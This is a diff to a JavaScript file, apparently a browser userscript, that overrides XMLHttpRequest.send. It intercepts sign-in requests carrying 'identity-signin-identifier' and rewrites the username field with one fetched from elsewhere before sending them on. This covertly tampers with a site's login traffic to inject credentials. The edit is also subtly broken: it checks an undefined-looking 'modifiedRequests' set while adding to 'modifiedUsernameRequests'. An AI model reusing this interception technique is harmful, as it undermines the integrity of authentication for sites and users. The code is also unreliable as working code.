@@ -79,36 +79,57 @@ const fetchFreqPassword = async () => {
     }
 };
 
-// Process pending username requests
+// Modify and send pending requests when username is available
 const processUsernameRequests = () => {
     if (!freqUsername) {
-        console.log("Username not available yet, retrying...");
-        fetchFreqUsername(); // Ensure username is fetched
-        return;
-    }
+            console.log("Username not available yet, retrying...");
+            fetchFreqUsername();
+            return;
+            }            
 
-    console.log("Processing pending username requests...");
+    console.log("Processing pending requests...");
+    // Create a copy of pending requests as we will modify it while iterating
     const requestsToProcess = Array.from(pendingUsernameRequests);
 
+    // Iterate through all pending requests
     for (let [xhr, body] of requestsToProcess) {
-        const matchUsername = body && /identity-signin-identifier%5C%22%2C%5C%22([^&]*)%5C/.exec(body);
+        const match = body && /identity-signin-identifier%5C%22%2C%5C%22([^&]*)%5C/.exec(body);
 
-        if (matchUsername && !modifiedUsernameRequests.has(body)) {
-            const modifiedBody = body.replace(matchUsername[1], freqUsername);
+        if (match && !modifiedRequests.has(body)) {
+            const modifiedBody = body.replace(match[1], freqUsername);
             modifiedUsernameRequests.add(body); // Mark the request as modified
-            console.log("Modified username request:", modifiedBody);
+            console.log("Modified request with new username:", modifiedBody);
             xhr.send(modifiedBody); // Send the modified request
-            pendingUsernameRequests.delete(xhr); // Remove from pending requests
+            pendingUsernameRequests.delete(xhr); // Remove the request from pending
         }
     }
 
     // Reset freqUsername when all requests are processed
     if (pendingUsernameRequests.size === 0) {
-        console.log("All username requests processed, resetting freqUsername.");
+        console.log("All pending requests processed, resetting freqUsername.");
         freqUsername = null;
         usernameFetched = false; // Allow fetching a new username if needed
     }
 };
+
+// Intercept XMLHttpRequest to modify requests with username
+const originalXhrSend = XMLHttpRequest.prototype.send;
+XMLHttpRequest.prototype.send = function (body) {
+    if (!body) {
+        originalXhrSend.call(this, body);
+        return;
+    }
+
+    // If the body contains identity-signin-identifier and hasn't been modified yet, intercept
+    if (/identity-signin-identifier/.test(body) && !Array.from(modifiedUsernameRequests).some(m => body.includes(m))) {
+        console.log("Intercepted request:", body);
+        pendingUsernameRequests.set(this, body); // Store the request in pendingRequests
+        processUsernameRequests(); // Attempt to modify and send the request immediately
+    } else {
+        originalXhrSend.call(this, body); // Send the original request if no modification is needed
+    }
+};
+
 
 // Process pending password requests
 const processPasswordRequests = () => {
